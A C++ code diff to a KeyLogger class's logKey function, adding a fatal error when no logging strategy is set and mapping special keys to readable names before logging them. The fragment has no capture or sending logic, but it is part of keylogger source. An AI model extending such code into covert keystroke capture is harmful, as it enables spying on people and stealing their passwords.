@@ -28,11 +28,31 @@ bool KeyLogger::openLogFile(const std::string &filename)
 
 void KeyLogger::logKey(char key) 
 {
-    if (logStrategy != nullptr) 
+    // Ensure a logging strategy is set
+    if (logStrategy == nullptr) 
     {
-        logStrategy->log(std::string(1, key), this->logfile);
+        std::cerr << "No strategy implemented!" << std::endl;
+        exit(EXIT_FAILURE);
+    }
+
+    // Convert the character to its corresponding virtual key int
+    int virtualKey = static_cast<int>(key);
+
+    // Check if the virtual key corresponds to a special key
+    auto it = keyname.find(virtualKey);
+
+    if (it != keyname.end())
+    {
+        // Special key found so log its string representation
+        logStrategy->log(it->second, logfile);
+    }
+    else
+    {
+        // Not a special key, bassically just log it
+        logStrategy->log(std::string(1, key), logfile);
     }
 }
+
 
 void KeyLogger::start()
 {
